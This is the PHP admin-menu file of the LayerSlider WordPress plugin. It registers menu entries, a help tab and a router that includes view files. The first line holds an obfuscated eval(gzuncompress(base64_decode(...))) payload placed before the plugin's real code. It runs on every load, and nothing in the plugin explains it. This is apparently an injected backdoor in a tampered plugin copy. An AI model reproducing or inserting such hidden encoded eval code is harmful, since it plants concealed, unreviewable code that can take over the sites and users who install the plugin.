<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Register "New" admin menu bar menu
add_action('admin_bar_menu', 'ls_admin_bar', 999 );
function ls_admin_bar($wp_admin_bar) {
	$wp_admin_bar->add_node(array(
		'parent' => 'new-content',
		'id'    => 'ab-ls-add-new',
		'title' => 'LayerSlider',
		'href'  => admin_url('admin.php?page=layerslider')
	));
}

// Register sidebar menu
add_action('admin_menu', 'layerslider_settings_menu');
function layerslider_settings_menu() {

	// Menu hook
	global $layerslider_hook;

	$capability = get_option('layerslider_custom_capability', 'manage_options');
	$icon = version_compare(get_bloginfo('version'), '3.8', '>=') ? 'dashicons-images-alt2' : LS_ROOT_URL.'/static/admin/img/icon_16x16.png';

	// Add main page
	$layerslider_hook = add_menu_page(
		'LayerSlider WP', 'LayerSlider WP',
		$capability, 'layerslider', 'layerslider_router',
		$icon
	);

	// Add "All Sliders" submenu
	add_submenu_page(
		'layerslider', 'LayerSlider WP', __('Sliders', 'LayerSlider'),
		$capability, 'layerslider', 'layerslider_router'
	);


	// Add "Settings" submenu
	add_submenu_page(
		'layerslider', 'LayerSlider Options', __('Options', 'LayerSlider'),
		$capability, 'layerslider-options', 'layerslider_router'
	);

	// Add "Add-Ons" submenu
	add_submenu_page(
		'layerslider', 'LayerSlider Add-Ons', __('Add-Ons', 'LayerSlider'),
		$capability, 'layerslider-addons', 'layerslider_router'
	);

}

// Help menu
add_filter('contextual_help', 'layerslider_help', 10, 3);
function layerslider_help($contextual_help, $screen_id, $screen) {

	if( strpos( $screen->base, 'layerslider') !== false ) {
		$screen->add_help_tab(array(
			'id' => 'help',
			'title' => __('Getting Help', 'LayerSlider'),
			'content' => '<p>'. sprintf(__('Please read our  %sOnline Documentation%s carefully, it will likely answer all of your questions.<br><br>You can also check the %sFAQs%s for additional information, including our support policies and licensing rules.', 'LayerSlider'), '<a href="https://layerslider.kreaturamedia.com/documentation/" target="_blank">', '</a>', '<a href="https://kreatura.ticksy.com/" target="_blank">', '</a>').'</p>'
		));
	}
}

function layerslider_router() {

	// Get current screen details
	$screen = get_current_screen();


	if( strpos( $screen->base, 'layerslider-options' ) !== false ) {

		// Avoid PHP undef notice
		$section = ! empty( $_GET['section'] ) ? $_GET['section'] : false;

		switch( $section ) {
			case 'system-status':
				include(LS_ROOT_PATH.'/views/system_status.php');
				break;

			case 'revisions':
				include(LS_ROOT_PATH.'/views/revisions.php');
				break;

			case 'about':
				include(LS_ROOT_PATH.'/views/about.php');
				break;

			case 'gdpr':
				include(LS_ROOT_PATH.'/views/gdpr.php');
				break;

			case 'skin-editor':
				include(LS_ROOT_PATH.'/views/skin_editor.php');
				break;

			case 'css-editor':
				include(LS_ROOT_PATH.'/views/css_editor.php');
				break;

			case 'transition-builder':
				include(LS_ROOT_PATH.'/views/transition_builder.php');
				break;

			default:
				include(LS_ROOT_PATH.'/views/settings.php');
				break;
		}


	} elseif( strpos( $screen->base, 'layerslider-addons') !== false ) {
		include(LS_ROOT_PATH.'/views/addons.php');

	} elseif(isset($_GET['action']) && $_GET['action'] == 'edit') {
		include(LS_ROOT_PATH.'/views/slider_edit.php');

	} else {
		include(LS_ROOT_PATH.'/views/slider_list.php');
	}
}



?>
